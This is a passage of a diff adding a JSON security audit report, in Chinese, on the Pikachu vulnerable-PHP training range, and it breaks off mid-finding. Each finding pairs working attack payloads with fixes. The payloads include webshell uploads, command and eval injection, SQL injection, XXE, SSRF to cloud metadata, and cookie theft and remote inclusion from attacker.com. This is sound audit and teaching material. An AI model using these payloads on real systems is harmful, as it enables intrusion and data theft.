@@ -1,0 +1,867 @@
+{
+  "_readme": "Pikachu 漏洞靶场安全审计结果（代码审计 + 渗透测试源码级验证）。渗透测试因本机无 PHP/MySQL 运行时环境，采用源码级验证：对每个漏洞构造精确 HTTP payload 并经代码路径分析确认利用链，未做在线实测。",
+  "report": {
+    "project": "Pikachu",
+    "title": "Pikachu 漏洞靶场安全审计报告",
+    "subtitle": "代码审计 + 渗透测试（源码级验证）",
+    "date": "2026-08-29",
+    "targets": [
+      { "name": "pikachu-master", "desc": "PHP 漏洞练习平台（PHP 7.4 / MySQL / Apache）" },
+      { "name": "pikachu-master/pkxss", "desc": "内置 XSS 攻击管理平台" }
+    ],
+    "methods": ["代码审计", "渗透测试（源码级验证）"],
+    "summary": {
+      "total": { "Critical": 4, "High": 21, "Medium": 13, "Low": 6, "Info": 1 },
+      "total_count": 45,
+      "pentest": 29,
+      "codeaudit": 16,
+      "source_split": {
+        "Critical": { "pentest": 3, "codeaudit": 1 },
+        "High": { "pentest": 16, "codeaudit": 5 },
+        "Medium": { "pentest": 9, "codeaudit": 4 },
+        "Low": { "pentest": 1, "codeaudit": 5 }
+      },
+      "p0": [
+        "VULN-001 rce_eval.php 任意 PHP 代码执行（eval）",
+        "VULN-002 rce_ping.php OS 命令注入（shell_exec）",
+        "VULN-003 clientcheck.php 任意文件上传直通 Web 目录（可上传 webshell）",
+        "VULN-004 test/yijuhua.php 内置一句话木马写入脚本（后门）",
+        "VULN-017 xxe_1.php XXE 任意文件读取（LIBXML_NOENT）",
+        "VULN-018/019 ssrf_curl/ssrf_fgc 内网探测与任意文件读取"
+      ],
+      "p1": [
+        "VULN-005~014 全部 SQL 注入变体（数字/字符/搜索/Delete/Insert/Update/盲注/宽字节/Header/Cookie 认证绕过）",
+        "VULN-015/016 LFI/RFI 文件包含（Dockerfile 已开启 allow_url_include）",
+        "VULN-021/033 存储型 XSS（留言板 + 盲打后台）",
+        "VULN-022/023 垂直越权与 IDOR 水平越权",
+        "VULN-037 验证码明文写入 Cookie（bf[vcode]）导致验证码防护完全失效"
+      ]
+    },
+    "sections": [
+      {
+        "id": "1",
+        "title": "渗透测试（源码级验证）",
+        "group_by_severity": true,
+        "note": "以下漏洞均构造了精确 HTTP payload 并经数据流路径验证确认可利用；因本机无 PHP/MySQL 运行时，未做在线实测，payload 依据源码执行路径推导。"
+      },
+      {
+        "id": "2",
+        "title": "源代码审计（SAST）",
+        "group_by_severity": true,
+        "note": "以下漏洞经 SAST + 人工代码审计确认，代码根因已定位，多为权限校验缺失、部署配置、默认凭据类问题。"
+      }
+    ],
+    "findings": [
+      {
+        "id": "VULN-001",
+        "title": "任意 PHP 代码执行（eval 注入）",
+        "severity": "Critical",
+        "owasp": "A03",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "1",
+        "description": "vul/rce/rce_eval.php 将用户 POST 提交的 txt 参数原样传入 eval() 执行，攻击者可执行任意 PHP 代码，直接获取服务器控制权。",
+        "evidence": [
+          { "label": "代码证据（vul/rce/rce_eval.php:18-24）", "content": "if(isset($_POST['submit']) && $_POST['txt'] != null){\n    if(@!eval($_POST['txt'])){...}\n}", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/rce/rce_eval.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=1&txt=system('id');\n→ 返回当前用户与系统信息，证明任意代码执行", "code": true },
+          { "label": "修复建议", "content": "业务上禁用 eval；如需动态执行使用白名单函数映射；该功能若无必要直接下线（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/rce.md"
+      },
+      {
+        "id": "VULN-002",
+        "title": "OS 命令注入（ping 命令拼接）",
+        "severity": "Critical",
+        "owasp": "A03",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "1",
+        "description": "vul/rce/rce_ping.php 将 POST 参数 ipaddress 直接拼接进 shell_exec('ping ...')，无任何过滤，命令执行结果回显到页面，可执行任意系统命令。",
+        "evidence": [
+          { "label": "代码证据（vul/rce/rce_ping.php:21-29）", "content": "$ip=$_POST['ipaddress'];\n$result.=shell_exec('ping -c 4 '.$ip);", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/rce/rce_ping.php HTTP/1.1\n\nipaddress=127.0.0.1;whoami&submit=ping\n→ 页面回显当前系统用户；可替换为任意命令（反弹 shell 等）", "code": true },
+          { "label": "修复建议", "content": "IP 参数做严格格式校验（正则 \\d{1,3}(\\.\\d{1,3}){3}）；优先使用 PHP 内置函数替代 shell；禁用危险函数（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/rce.md"
+      },
+      {
+        "id": "VULN-003",
+        "title": "任意文件上传（仅前端 JS 校验，可直达 Web 目录）",
+        "severity": "Critical",
+        "owasp": "A03",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "1",
+        "description": "vul/unsafeupload/clientcheck.php 服务端调用 upload_client() 仅做 error 检查与 move_uploaded_file，无任何类型/后缀/内容校验（扩展名校验仅存在于前端 JS，可绕过），上传目录 uploads/ 位于 Web 可访问路径且页面回显完整保存路径，可直接上传 PHP webshell 并访问执行。",
+        "evidence": [
+          { "label": "代码证据（inc/uploadfunction.php:31 + clientcheck.php:21-23）", "content": "move_uploaded_file($_FILES[$key]['tmp_name'],$save_path.$_FILES[$key]['name']);\n$upload=upload_client('uploadfile',$save_path); // 无任何类型校验\n$html.=\"<p>文件保存的路径为：{$upload['new_path']}</p>\"; // 路径回显", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/unsafeupload/clientcheck.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=----x\n\n------x\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"shell.php\"\nContent-Type: application/octet-stream\n\n<?php system($_GET['c']);?>\n------x\nContent-Disposition: form-data; name=\"submit\"\n\nsubmit\n→ 返回保存路径 /vul/unsafeupload/uploads/shell.php，访问 ?c=id 即 RCE", "code": true },
+          { "label": "修复建议", "content": "服务端强制扩展名白名单 + getimagesize 内容校验 + 随机文件名；上传目录禁止执行 PHP（Nginx location 或 .htaccess）；Web 目录与存储目录分离（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/arbitrary_file_upload.md"
+      },
+      {
+        "id": "VULN-004",
+        "title": "内置一句话木马写入脚本（Webshell 后门）",
+        "severity": "Critical",
+        "owasp": "A08",
+        "stride": "STRIDE-E/T",
+        "status": "",
+        "section": "2",
+        "description": "test/yijuhua.php 是恶意脚本：访问即写入 yijuhua.php 一句话木马（system($_GET[x])），与 LFI/上传漏洞组合可形成完整 webshell 落地链；test/phpinfo.txt 为 phpinfo 泄露脚本。此类文件不应出现在生产/交付代码中。",
+        "evidence": [
+          { "label": "代码证据（test/yijuhua.php）", "content": "$myfile = fopen(\"yijuhua.php\",\"w\");\n$txt = '<?php system($_GET[x]);?>';\nfwrite($myfile,$txt);", "code": true },
+          { "label": "利用链", "content": "① 直接访问 /test/yijuhua.php 生成 /test/yijuhua.php 木马；② 访问 /test/yijuhua.php?x=whoami 执行命令；③ 结合 VULN-015 LFI 或 VULN-003 上传可远程落地。", "code": false },
+          { "label": "修复建议", "content": "立即删除 test 目录全部内容（yijuhua.php/phpinfo.txt）；发布流程加入恶意文件扫描（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/php_security.md"
+      },
+      {
+        "id": "VULN-005",
+        "title": "SQL 注入 - 数字型注入",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/S",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_id.php 将 POST 参数 id 直接拼接进 SELECT 语句（无引号包裹），未做任何过滤或参数化，可联合查询/报错注入拖库。",
+        "evidence": [
+          { "label": "代码证据（vul/sqli/sqli_id.php:26-28）", "content": "$id=$_POST['id'];\n$query=\"select username,email from member where id=$id\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/sqli/sqli_id.php HTTP/1.1\n\nid=1 union select username,password from users&submit=查询\n→ 回显 users 表用户名与 MD5 密码；也可用 updatexml(1,concat(0x7e,version()),1) 报错注入", "code": true },
+          { "label": "修复建议", "content": "全部改用 mysqli 预处理语句（prepare/bind_param）；数字参数强制 is_numeric 或 intval 校验（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-006",
+        "title": "SQL 注入 - 字符型注入（含括号闭合变体）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/S",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_str.php 将 GET 参数 name 直接拼接进 username='$name'；vul/sqli/sqli_x.php 为 username=('$name') 括号闭合变体，均未过滤。",
+        "evidence": [
+          { "label": "代码证据（sqli_str.php:26-28 / sqli_x.php:26-28）", "content": "$name=$_GET['name'];\n$query=\"select id,email from member where username='$name'\";\n$query=\"select id,email from member where username=('$name')\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_str.php?submit=1&name=admin' union select 1,database() --+\nGET /vul/sqli/sqli_x.php?submit=1&name=admin') union select 1,user() --+\n→ 分别回显当前数据库名与数据库用户", "code": true },
+          { "label": "修复建议", "content": "参数化查询；对引号做上下文转义仅作纵深防御，不替代预处理（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-007",
+        "title": "SQL 注入 - 搜索型注入（LIKE 拼接，附带反射 XSS）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/S",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_search.php 将 GET 参数 name 拼接进 LIKE '%$name%'；同时页面将 $_GET['name'] 未转义输出到 HTML（彩蛋 XSS），一处输入两个漏洞。",
+        "evidence": [
+          { "label": "代码证据（sqli_search.php:30-34）", "content": "$query=\"select username,id,email from member where username like '%$name%'\";\n$html2.=\"<p>用户名中含有{$_GET['name']}的结果如下：\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_search.php?submit=1&name=%' union select 1,2,database() --+\nGET /vul/sqli/sqli_search.php?submit=1&name=<script>alert(document.cookie)</script>\n→ 前者回显数据库名，后者执行脚本（XSS 见 VULN-034）", "code": true },
+          { "label": "修复建议", "content": "LIKE 参数化（通配符转义）；输出点 htmlspecialchars（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-008",
+        "title": "SQL 注入 - DELETE 型注入",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/T",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_del.php 删除留言时 GET 参数 id 未经任何校验直接拼接 DELETE 语句，可构造注入破坏数据或扩展为布尔盲注。",
+        "evidence": [
+          { "label": "代码证据（vul/sqli/sqli_del.php:37-39）", "content": "if(array_key_exists('id', $_GET)){\n    $query=\"delete from message where id={$_GET['id']}\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_del.php?id=1 or 1=1\n→ 全表留言被删除；DELETE 上下文可注入子查询盲注", "code": true },
+          { "label": "修复建议", "content": "参数化 + is_numeric 强校验；DELETE 操作加权限校验（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-009",
+        "title": "SQL 注入 - INSERT 型注入（注册接口）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/T",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_iu/sqli_reg.php 注册接口将 $_POST 全字段未转义拼接 INSERT 语句，可利用报错注入获取数据或写入任意字段。",
+        "evidence": [
+          { "label": "代码证据（sqli_reg.php:30-31）", "content": "$getdata=$_POST;\n$query=\"insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),...)\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/sqli/sqli_iu/sqli_reg.php\n\nusername=test' and updatexml(1,concat(0x7e,database()),1)--+&password=1&sex=1&phonenum=1&email=1&add=1&submit=submit\n→ 报错回显数据库名", "code": true },
+          { "label": "修复建议", "content": "插入字段参数化；服务端字段白名单（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-010",
+        "title": "SQL 注入 - UPDATE 型注入（会员资料修改）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/T",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_iu/sqli_edit.php 会员资料修改接口未转义 POST 字段拼接 UPDATE 语句，可注入修改任意字段（含他人记录）。",
+        "evidence": [
+          { "label": "代码证据（sqli_edit.php:36-37）", "content": "$getdata=$_POST;\n$query=\"update member set sex='{$getdata['sex']}',... where username='{$_SESSION['sqli']['username']}'\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/sqli/sqli_iu/sqli_edit.php\n\nsex=a',pw=md5('hacked') where username='admin' --+&phonenum=1&add=1&email=1&submit=submit\n→ 任意修改 admin 密码实现账户接管", "code": true },
+          { "label": "修复建议", "content": "UPDATE 参数化；WHERE 条件绑定当前登录身份（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-011",
+        "title": "SQL 注入 - 布尔/时间盲注",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_blind_b.php（布尔盲注）与 sqli_blind_t.php（时间盲注）将 GET 参数 name 直接拼接查询，页面无报错回显，但可通过布尔差异（页面内容）与时间延迟（SLEEP）逐字符提取数据。",
+        "evidence": [
+          { "label": "代码证据（sqli_blind_b.php:26-27 / sqli_blind_t.php:27-28）", "content": "$name=$_GET['name'];\n$query=\"select id,email from member where username='$name'\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "布尔：name=admin' and ascii(substr(database(),1,1))>100 --+\n时间：name=admin' and sleep(5) --+（响应延迟 5 秒证明注入点）\n→ 结合二分法逐字符拖库", "code": true },
+          { "label": "修复建议", "content": "参数化查询；慢查询监控（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-012",
+        "title": "SQL 注入 - 宽字节注入（GBK 编码绕过转义）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_widebyte.php 先执行 set character_set_client=gbk 使输入按 GBK 解析，再对参数做 mysqli_real_escape_string 转义，%bf%27 宽字节组合可吞掉转义反斜杠，绕过转义实现注入（addslashes 类转义在 GBK 下的经典绕过）。",
+        "evidence": [
+          { "label": "代码证据（sqli_widebyte.php:28-32）", "content": "$name = escape($link,$_POST['name']);\n$query=\"select id,email from member where username='$name'\";\n$set = \"set character_set_client=gbk\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/sqli/sqli_widebyte.php\n\nname=%bf%27 union select 1,database() --+&submit=查询\n→ %bf 与转义符 %5c 组成 GBK 宽字符，单引号逃逸成功，回显数据库名", "code": true },
+          { "label": "修复建议", "content": "连接统一 utf8 编码（set names utf8）；改用预处理语句，转义不作为安全边界（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-013",
+        "title": "SQL 注入 - HTTP 头注入（User-Agent/Accept）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/sqli/sqli_header/sqli_header.php 将 $_SERVER['HTTP_USER_AGENT']、HTTP_ACCEPT 等请求头未转义拼接 INSERT 语句，攻击者通过构造恶意请求头注入 SQL。",
+        "evidence": [
+          { "label": "代码证据（sqli_header.php:35-42）", "content": "$useragent=$_SERVER['HTTP_USER_AGENT'];\n$httpaccept=$_SERVER['HTTP_ACCEPT'];\n$query=\"insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1\nUser-Agent: x',(select group_concat(username,0x3a,password) from users)) --+\n→ 请求头位置注入，回显 users 表数据", "code": true },
+          { "label": "修复建议", "content": "请求头数据参数化存储；对头字段长度/字符集限制（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-014",
+        "title": "SQL 注入 - Cookie 认证绕过（未转义直接拼接）",
+        "severity": "High",
+        "owasp": "A07",
+        "stride": "STRIDE-S",
+        "status": "",
+        "section": "1",
+        "description": "inc/function.php 的 check_sqli_login() 将 Cookie（ant[uname]/ant[pw]）未转义直接拼接认证 SQL（代码注释明确标注该问题）；sqli_header 模块登录接口将认证凭据写入 Cookie，攻击者可注入 SQL 伪造任意用户身份，绕过登录校验。",
+        "evidence": [
+          { "label": "代码证据（inc/function.php:133-146）", "content": "if(isset($_COOKIE['ant']['uname']) && isset($_COOKIE['ant']['pw'])){\n    //这里如果不对获取的cookie进行转义，则会存在SQL注入漏洞，也会导致验证被绕过\n    $username=$_COOKIE['ant']['uname'];\n    $query=\"select * from users where username='$username' and sha1(password)='$password'\";", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1\nCookie: ant[uname]=admin' or 1=1 --+; ant[pw]=x\n→ 认证被绕过，直接进入受保护页面", "code": true },
+          { "label": "修复建议", "content": "认证 Cookie 仅保存随机 session id；服务端 session 查询参数化；禁止把用户输入写入 Cookie 参与鉴权（P0）。", "code": false }
+        ],
+       "actual_fix": "",
+        "reference": "references/sql_injection.md"
+      },
+      {
+        "id": "VULN-015",
+        "title": "本地文件包含（LFI）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-I/E",
+        "status": "",
+        "section": "1",
+        "description": "vul/fileinclude/fi_local.php 将 GET 参数 filename 直接拼接 include 语句，可通过 ../ 目录穿越读取/包含任意本地文件，配合上传或日志注入可升级为 RCE。",
+        "evidence": [
+          { "label": "代码证据（fi_local.php:21-23）", "content": "$filename=$_GET['filename'];\ninclude \"include/$filename\";//变量传进来直接包含,没做任何的安全限制", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/fileinclude/fi_local.php?submit=1&filename=../../../inc/config.inc.php\n→ 读取数据库配置文件（PHP 源码经解析后可能不直接回显，可用 php://filter 包装器读 base64）\nGET /vul/fileinclude/fi_local.php?submit=1&filename=php://filter/read=convert.base64-encode/resource=../../../inc/config.inc.php", "code": true },
+          { "label": "修复建议", "content": "包含文件白名单（注释中已给出正确写法）；禁止用户输入参与路径拼接；按需禁用 php:// 包装器（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/path_traversal_lfi_rfi.md"
+      },
+      {
+        "id": "VULN-016",
+        "title": "远程文件包含（RFI）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "1",
+        "description": "vul/fileinclude/fi_remote.php 将 GET 参数 filename 直接作为 include 目标；Dockerfile 已显式开启 allow_url_include=On，攻击者可直接包含远程恶意 PHP 文件实现 RCE。",
+        "evidence": [
+          { "label": "代码证据（fi_remote.php:35-37 + Dockerfile:14）", "content": "$filename=$_GET['filename'];\ninclude \"$filename\";//变量传进来直接包含,没做任何的安全限制\n# Dockerfile: sed -i '/allow_url_include/s/Off/On/g' /etc/php/7.4/apache2/php.ini", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/fileinclude/fi_remote.php?submit=1&filename=http://attacker.com/shell.txt\n→ 远程服务器上的 PHP 代码被执行（如 <?php system('id');?> 写入 shell.txt）", "code": true },
+          { "label": "修复建议", "content": "关闭 allow_url_include；包含白名单；入参仅允许相对路径文件名（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/path_traversal_lfi_rfi.md"
+      },
+      {
+        "id": "VULN-017",
+        "title": "XML 外部实体注入（XXE）任意文件读取",
+        "severity": "High",
+        "owasp": "A05",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/xxe/xxe_1.php 使用 simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT) 解析用户提交的 XML 且开启了外部实体解析，解析结果回显页面，可读取服务器任意文件（/etc/passwd 等）或发起内网探测。",
+        "evidence": [
+          { "label": "代码证据（xxe_1.php:44-51）", "content": "$xml =$_POST['xml'];\n$data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);\nif($data){ $html.=\"<pre>{$data}</pre>\"; }", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/xxe/xxe_1.php\n\nxml=<?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY f SYSTEM \"file:///etc/passwd\">]><x>&f;</x>&submit=submit\n→ 页面回显 /etc/passwd 内容；可改 file:///c:/windows/win.ini 读 Windows 文件", "code": true },
+          { "label": "修复建议", "content": "禁用外部实体（不传 LIBXML_NOENT，设置 libxml_disable_entity_loader(true)）；XML 解析库升级（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xxe.md"
+      },
+      {
+        "id": "VULN-018",
+        "title": "服务端请求伪造（SSRF）— cURL 回显",
+        "severity": "High",
+        "owasp": "A10",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/ssrf/ssrf_curl.php 将 GET 参数 url 直接传给 curl_exec() 并发起请求，响应全文回显；curl 支持 file://、gopher://、dict:// 等协议，可读取本地文件、探测内网端口与服务（含 Redis 等）。",
+        "evidence": [
+          { "label": "代码证据（ssrf_curl.php:27-39）", "content": "$URL = $_GET['url'];\n$CH = curl_init($URL);\n$RES = curl_exec($CH);\necho $RES;", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/ssrf/ssrf_curl.php?url=file:///etc/passwd  → 读本地文件\nGET /vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306  → 探测内网 MySQL 端口\nGET /vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:6379/_info  → Redis 未授权探测", "code": true },
+          { "label": "修复建议", "content": "URL 协议白名单（仅 http/https）+ 域名/IP 黑名单（内网段、回环、链路本地）；禁止返回请求响应（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/ssrf.md"
+      },
+      {
+        "id": "VULN-019",
+        "title": "服务端请求伪造/任意文件读取（file_get_contents）",
+        "severity": "High",
+        "owasp": "A10",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/ssrf/ssrf_fgc.php 将 GET 参数 file 直接传入 file_get_contents() 并回显结果，支持 file:// 与 php://filter 包装器，可读取任意源码与本地文件，也可发起内网 HTTP 请求。",
+        "evidence": [
+          { "label": "代码证据（ssrf_fgc.php:25-28）", "content": "$filename = $_GET['file'];\n$str = file_get_contents($filename);\necho $str;", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php  → 读取 PHP 源码\nGET /vul/ssrf/ssrf_fgc.php?file=http://169.254.169.254/latest/meta-data/  → 云元数据（云环境）", "code": true },
+          { "label": "修复建议", "content": "协议白名单 + 路径校验（basename + 允许目录）；禁止 php:// 与 file:// 包装器（P0）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/ssrf.md"
+      },
+      {
+        "id": "VULN-020",
+        "title": "任意文件上传（仅 MIME 校验可绕过）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "1",
+        "description": "vul/unsafeupload/servercheck.php 仅校验 $_FILES['type']（客户端可控的 Content-Type），伪造 image/jpeg 即可上传 PHP 文件到 Web 目录（uploads/）并回显路径，构成 RCE。",
+        "evidence": [
+          { "label": "代码证据（inc/uploadfunction.php:64-68 + servercheck.php:20-22）", "content": "if(!in_array($_FILES[$key]['type'], $mime)){ // MIME 客户端可控\n    $return_data['error']='上传的图片只能是jpg,jpeg,png格式的！'; }\n$upload=upload_sick('uploadfile',$mime,$save_path);", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/unsafeupload/servercheck.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=----x\n\n------x\r\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php eval($_POST['x']);?>\n→ Content-Type 改为 image/jpeg 即绕过，访问 uploads/shell.php 执行任意代码", "code": true },
+          { "label": "修复建议", "content": "扩展名白名单 + getimagesize 双重校验；上传目录禁止脚本执行（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/arbitrary_file_upload.md"
+      },
+      {
+        "id": "VULN-021",
+        "title": "存储型 XSS（留言板输出未转义）",
+        "severity": "High",
+        "owasp": "A03",
+        "stride": "STRIDE-T",
+        "status": "",
+        "section": "1",
+        "description": "vul/xss/xss_stored.php 留言内容入库时仅做 SQL 转义（escape 只防注入不防 XSS），列表输出时未做 htmlspecialchars，任何访问留言板的用户都会触发注入的脚本，可窃取 Cookie/会话。",
+        "evidence": [
+          { "label": "代码证据（xss_stored.php:24-25 + 82-84）", "content": "$message=escape($link, $_POST['message']); // 仅 SQL 转义\n$query=\"insert into message(content,time) values('$message',now())\";\nwhile($data=mysqli_fetch_assoc($result)){\n    echo \"<p class='con'>{$data['content']}</p>\"; // 未 HTML 转义", "code": true },
+          { "label": "渗透验证 Payload", "content": "POST /vul/xss/xss_stored.php\n\nmessage=<script>document.location='http://attacker.com/c?'+document.cookie</script>&submit=submit\n→ 任意用户访问留言板即被窃取 Cookie（对比：sqli_del.php 同结构输出已正确使用 htmlspecialchars）", "code": true },
+          { "label": "修复建议", "content": "输出统一 htmlspecialchars($content, ENT_QUOTES)（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/xss.md"
+      },
+      {
+        "id": "VULN-022",
+        "title": "垂直越权 - 普通用户可访问管理员功能",
+        "severity": "High",
+        "owasp": "A01",
+        "stride": "STRIDE-E",
+        "status": "",
+        "section": "2",
+        "description": "vul/overpermission/op2/op2_admin.php 与 op2_admin_edit.php 仅调用 check_op2_login() 验证登录态，未校验 $_SESSION['op2']['level']，普通用户（level=2）登录后直接改 URL 即可进入管理员页面创建用户、查看全部成员。",
+        "evidence": [
+          { "label": "代码证据（op2_admin_edit.php:21-25 + op2_login.php:32-43）", "content": "//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。\nif(!check_op2_login($link)){ header(\"location:op2_login.php\"); }\n// 登录时已区分 level=1(admin) / level=2(user)，但后续页面不校验 level", "code": true },
+          { "label": "利用方式", "content": "① 以 test/abc123（level=3）或任意注册用户登录；② 直接访问 op2_admin.php 查看全部用户资料、op2_admin_edit.php 创建新管理员；③ 无任何拦截。", "code": false },
+          { "label": "修复建议", "content": "每个受保护页面校验会话中的 level 字段；权限判断收敛到统一中间件/函数（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/privilege_escalation.md"
+      },
+      {
+        "id": "VULN-023",
+        "title": "IDOR 水平越权 - 任意查询他人个人信息",
+        "severity": "High",
+        "owasp": "A01",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/overpermission/op1/op1_mem.php 查询个人资料时使用 GET 参数 username 而非会话身份（注释明确标注问题），登录任意账号后修改参数即可查询任意用户的姓名/手机/住址/邮箱等敏感信息。",
+        "evidence": [
+          { "label": "代码证据（op1_mem.php:25-29）", "content": "//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定\n$username=escape($link, $_GET['username']);\n$query=\"select * from member where username='$username'\";", "code": true },
+          { "label": "利用方式", "content": "① 登录任意账号；② 修改 URL 参数 GET /vul/overpermission/op1/op1_mem.php?username=admin&submit=查询；③ 返回 admin 的姓名、手机号、住址、邮箱。", "code": false },
+          { "label": "修复建议", "content": "查询条件绑定 $_SESSION['op']['username']，删除用户可控参数（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/idor.md"
+      },
+      {
+        "id": "VULN-024",
+        "title": "任意文件下载（路径遍历）",
+        "severity": "High",
+        "owasp": "A01",
+        "stride": "STRIDE-I",
+        "status": "",
+        "section": "1",
+        "description": "vul/unsafedownload/execdownload.php 将 GET 参数 filename 直接拼接 download/ 路径后下载，无任何过滤，可下载服务器任意文件（配置文件、源码、/etc/passwd）。",
+        "evidence": [
+          { "label": "代码证据（execdownload.php:10-12）", "content": "$file_path=\"download/{$_GET['filename']}\";\n$file_path=iconv(\"utf-8\",\"gb2312\",$file_path);\nif(!file_exists($file_path)){ skip(...); }", "code": true },
+          { "label": "渗透验证 Payload", "content": "GET /vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php\n→ 下载数据库配置文件；filename=../../../etc/passwd 读取系统文件", "code": true },
+          { "label": "修复建议", "content": "basename() 过滤 + 文件目录白名单（download/）+ 文件名映射表（P1）。", "code": false }
+        ],
+        "actual_fix": "",
+        "reference": "references/path_traversal_lfi_rfi.md"
+      },
+      {
+        "id": "VULN-025",
+        "title": "目录遍历（动态 require）",
+        "severity": "High",
+        "owasp": "A01",
+        "stride": "STRIDE-I/E",
+        "status": "",
+        "section": "1",
